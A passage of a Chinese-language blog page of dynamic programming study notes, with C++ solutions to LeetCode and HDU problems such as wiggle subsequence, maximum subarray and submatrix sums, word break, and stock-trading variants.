right=mid;</span><br><span class="line">                &#125;</span><br><span class="line">                stk[left]=num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.<span class="built_in">empty</span>()||num&gt;stk.<span class="built_in">back</span>())</span><br><span class="line">                stk.<span class="built_in">push_back</span>(num);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 找到&gt;=num的第一个位置</span></span><br><span class="line">                <span class="keyword">auto</span> iter=<span class="built_in">lower_bound</span>(stk.<span class="built_in">begin</span>(),stk.<span class="built_in">end</span>(),num);</span><br><span class="line">                *iter=num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="9-1-1-2-376-摆动序列">9.1.1.2 <a href="https://leetcode.cn/problems/wiggle-subsequence/">376. 摆动序列</a></h4>
<p>$$<br>
dp[i][0]表示[0:i]范围内，以nums[i]为止，最后下降的序列长度\<br>
dp[i][1]表示[0:i]范围内，以nums[i]为止，最后上升的序列长度<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]-nums[j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[j][<span class="number">0</span>]<span class="number">+1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i]&lt;nums[j])&#123;</span><br><span class="line">                    dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i][<span class="number">0</span>],dp[j][<span class="number">1</span>]<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ans=<span class="built_in">max</span>(ans,<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[i][<span class="number">0</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>$$<br>
dp[i][0]表示[0:i]范围内，不一定以nums[i]结尾，最后下降的序列长度\<br>
dp[i][1]表示[0:i]范围内，不一定以nums[i]结尾，最后上升的序列长度<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//上升</span></span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]<span class="number">+1</span>);</span><br><span class="line">                dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                dp[i][<span class="number">1</span>]=dp[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">                dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]<span class="number">+1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">                dp[i][<span class="number">1</span>]=dp[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[n<span class="number">-1</span>][<span class="number">0</span>],dp[n<span class="number">-1</span>][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>空间优化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> up=<span class="number">1</span>,down=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                up=<span class="built_in">max</span>(up,down<span class="number">+1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                down=<span class="built_in">max</span>(down,up<span class="number">+1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(up,down);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>贪心算法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">size</span>() &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> sign = nums[<span class="number">0</span>] - nums[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> count = sign != <span class="number">0</span> ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; nums.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> cursign = nums[i - <span class="number">1</span>] - nums[i];</span><br><span class="line">        <span class="keyword">if</span> ((sign &gt;= <span class="number">0</span> &amp;&amp; cursign &lt; <span class="number">0</span>) || (sign &lt;= <span class="number">0</span> &amp;&amp; cursign &gt; <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            sign = cursign;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="9-2-最大子段和">9.2 最大子段和</h2>
<p><a href="https://blog.csdn.net/weixin_40170902/article/details/80585218">最大子段和问题：蛮力、递归及动态规划</a></p>
<blockquote>
<p>Given a sequence a[1],a[2],a[3]…a[n], your job is to calculate the max sum of a sub-sequence. For example, given (6,-1,5,4,-7), the max sum in this sequence is 6 + (-1) + 5 + 4 = 14.</p>
</blockquote>
<p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1003">Max Sum杭电</a></p>
<blockquote>
<p>主要思想：如果之前求和为正，则加上当前元素，同时每次记录当前最大值，</p>
<p>​					否则，前面求和为负，应从当前位置重新求和</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>错误位置，此处为正确写法</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210409201244924.png" alt="image-20210409201244924"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// freopen(&quot;HDU/max_sum.input&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="type">int</span> kase;</span><br><span class="line">    cin &gt;&gt; kase;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (kase--) &#123;</span><br><span class="line">        <span class="type">int</span> n; <span class="comment">//每一行数据数</span></span><br><span class="line">        <span class="type">int</span> max_sum, sum;</span><br><span class="line">        cin &gt;&gt; n &gt;&gt; sum;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; n &lt;&lt; endl;</span></span><br><span class="line">        max_sum = sum;</span><br><span class="line">        <span class="type">int</span> begin_pos = <span class="number">1</span>, end_pos = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> index = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> begin = <span class="number">1</span>, end = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> t;</span><br><span class="line">            index++;</span><br><span class="line">            cin &gt;&gt; t;</span><br><span class="line">            <span class="comment">//sum+t&gt;=t</span></span><br><span class="line">            <span class="keyword">if</span> (sum + t &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// cout &lt;&lt; &quot;sum: &quot; &lt;&lt; sum &lt;&lt; &quot;   t:&quot; &lt;&lt; t &lt;&lt; endl;</span></span><br><span class="line">                sum += t;</span><br><span class="line">                end_pos = index;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum = t;</span><br><span class="line">                begin_pos = index;</span><br><span class="line">                <span class="comment">//begin_pos=end_pos=index;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (sum &gt; max_sum) &#123;</span><br><span class="line">                max_sum = sum;</span><br><span class="line">                begin = begin_pos;</span><br><span class="line">                end = end_pos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Case &quot;</span> &lt;&lt; cnt++ &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; max_sum &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; begin &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; end &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (kase)</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="9-3-最大子矩阵和">9.3 最大子矩阵和</h2>
<blockquote>
<p>给定一个n*m的矩阵A，求A中的一个非空子矩阵，使这个子矩阵中的元素和最大。</p>
<p>其中，A的子矩阵指在A中行和列均连续的一块。</p>
<p><a href="https://blog.csdn.net/m0_38033475/article/details/79179338">链接</a></p>
<p>思想：将二维压缩到一维</p>
</blockquote>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 502</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *给定一个n*m的矩阵A，求A中的一个非空子矩阵，使这个子矩阵中的元素和最大。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[MAX_N][MAX_N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;HDU/input/max_matrix.input&quot;</span>, <span class="string">&quot;r&quot;</span>, stdin);</span><br><span class="line">    <span class="type">int</span> n, m; <span class="comment">// n行，m列</span></span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; ++j) &#123;</span><br><span class="line">            cin &gt;&gt; data[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max_result = data[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> column[MAX_N], dp[MAX_N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// memset(dp, 0, sizeof(int) * MAX_N);</span></span><br><span class="line">    <span class="comment">//从i行到j行压缩到column[k]中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(column, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">int</span>) * MAX_N);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= n; ++j) &#123;</span><br><span class="line">            <span class="comment">//对列的遍历</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= m; ++k) &#123;</span><br><span class="line">                column[k] += data[j][k];</span><br><span class="line">                <span class="keyword">if</span> (dp[k - <span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line">                    dp[k] = dp[k - <span class="number">1</span>] + column[k];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[k] = column[k];</span><br><span class="line">                max_result = <span class="built_in">max</span>(max_result, dp[k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; max_result &lt;&lt; endl;    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>10 分割类DP</h1>
<blockquote>
<p>对于分割类型题，动态规划的状态转移方程通常并不依赖相邻的位置，而是依赖于满足分割条件的位置。</p>
</blockquote>
<h4 id="10-1-1-1-139-单词拆分">10.1.1.1 <a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">unordered_set&lt;string&gt; <span class="title">record</span><span class="params">(wordDict.begin(),wordDict.end())</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n<span class="number">+1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">                <span class="comment">// 取字符[j:i]，找到一个可以分割的位置便可以返回</span></span><br><span class="line">                string tmp=s.<span class="built_in">substr</span>(j,i-j<span class="number">+1</span>);</span><br><span class="line">                <span class="keyword">if</span>(record.<span class="built_in">count</span>(tmp)&amp;&amp;dp[j])&#123;</span><br><span class="line">                    dp[i<span class="number">+1</span>]=<span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="10-1-1-2-140-单词拆分-II">10.1.1.2 <a href="https://leetcode.cn/problems/word-break-ii/">140. 单词拆分 II</a></h4>
<h4 id="10-1-1-3-279-完全平方数">10.1.1.3 <a href="https://leetcode.cn/problems/perfect-squares/">279. 完全平方数</a></h4>
<h1>11 股票交易类</h1>
<h4 id="11-1-1-1-123-买卖股票的最佳时机-III">11.1.1.1 <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iii/">123. 买卖股票的最佳时机 III</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(<span class="number">3</span>,INT_MIN)</span>,<span class="title">sell</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j++)&#123;</span><br><span class="line">                buy[j]=<span class="built_in">max</span>(buy[j],sell[j<span class="number">-1</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">                sell[j]=<span class="built_in">max</span>(sell[j],buy[j]+prices[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>只进行过一次买操作；</p>
</li>
<li class="lvl-2">
<p>进行了一次买操作和一次卖操作，即完成了一笔交易；</p>
</li>
<li class="lvl-2">
<p>在完成了一笔交易的前提下，进行了第二次买操作；</p>
</li>
<li class="lvl-2">
<p>完成了全部两笔交易。</p>
</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> buy1 = -prices[<span class="number">0</span>], sell1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> buy2 = -prices[<span class="number">0</span>], sell2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            buy1 = <span class="built_in">max</span>(buy1, -prices[i]);</span><br><span class="line">            sell1 = <span class="built_in">max</span>(sell1, buy1 + prices[i]);</span><br><span class="line">            buy2 = <span class="built_in">max</span>(buy2, sell1 - prices[i]);</span><br><span class="line">            sell2 = <span class="built_in">max</span>(sell2, buy2 + prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>分部讨论，fl[i]表示[0:i]进行股票交易可获得最大收益</p>
<p>fr[i]表示[i:]进行股票交易可获得最大收益</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">fl</span><span class="params">(n)</span>,<span class="title">fr</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">int</span> mn=prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fl[i]=<span class="built_in">max</span>(fl[i<span class="number">-1</span>],prices[i]-mn);</span><br><span class="line">            mn=<span class="built_in">min</span>(mn,prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mx=prices[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            fr[i]=<span class="built_in">max</span>(fr[i<span class="number">+1</span>],mx-prices[i]);</span><br><span class="line">            mx=<span class="built_in">max</span>(prices[i],mx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ret=<span class="built_in">max</span>(ret,fl[i]+fr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="11-1-1-2-188-买卖股票的最佳时机-IV">11.1.1.2 <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iv/">188. 买卖股票的最佳时机 IV</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(<span class="type">int</span> k, vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(k<span class="number">+1</span>,INT_MIN)</span>,<span class="title">sell</span><span class="params">(k<span class="number">+1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">                buy[j]=<span class="built_in">max</span>(buy[j],sell[j<span class="number">-1</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">                sell[j]=<span class="built_in">max</span>(sell[j],buy[j]+prices[i<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;j&lt;&lt;&quot; &quot;&lt;&lt;sell[j]&lt;&lt;endl;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="11-1-1-3-309-最佳买卖股票时机含冷冻期">11.1.1.3 <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-cooldown/">309. 最佳买卖股票时机含冷冻期</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(n<span class="number">+1</span>,INT_MIN)</span>,<span class="title">sell</span><span class="params">(n<span class="number">+1</span>)</span></span>;</span><br><span class="line">        buy[<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            buy[i]=<span class="built_in">max</span>(buy[i<span class="number">-1</span>],sell[i<span class="number">-2</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">            sell[i]=<span class="built_in">max</span>(sell[i<span class="number">-1</span>],buy[i]+prices[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//dp[i][0]表示第i天没有股票</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">                dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[<span class="number">0</span>][<span class="number">1</span>],-prices[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-2</span>][<span class="number">0</span>]-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
